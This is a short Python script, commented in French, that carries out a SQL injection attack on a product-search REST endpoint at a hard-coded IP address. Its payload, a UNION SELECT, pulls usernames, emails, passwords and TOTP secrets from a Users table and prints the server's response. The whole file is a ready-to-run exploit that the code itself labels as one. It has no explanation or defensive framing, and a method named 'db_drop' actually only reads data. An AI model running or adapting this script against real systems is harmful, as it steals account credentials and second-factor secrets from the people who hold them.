import requests

class UserCredentials:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def db_drop(self):
        # Endpoint cible
        endpoint = f"{self.base_url}/rest/products/search"
        print(endpoint)
        
        # Paramètres de la requête
        payload = {
            "q": "banana')) UNION SELECT username, email, password, totpSecret, 5, 6, 7, 8, 9 FROM Users--"
        }
        print(payload)
        
        try:
            # Envoi de la requête GET
            response = self.session.get(endpoint, params=payload, headers=self.headers)
            
            # Affichage de la réponse
            if response.status_code == 200:
                print("Requête réussie !")
                return response.text
            else:
                print(f"Requête échouée avec le code HTTP {response.status_code}.")
        except Exception as e:
            print(f"Une erreur est survenue : {e}")

def main():
    base_url = "http://45.76.47.218:3000"
    exploit = UserCredentials(base_url)
    exploit.db_drop()

if __name__ == "__main__":
    main()
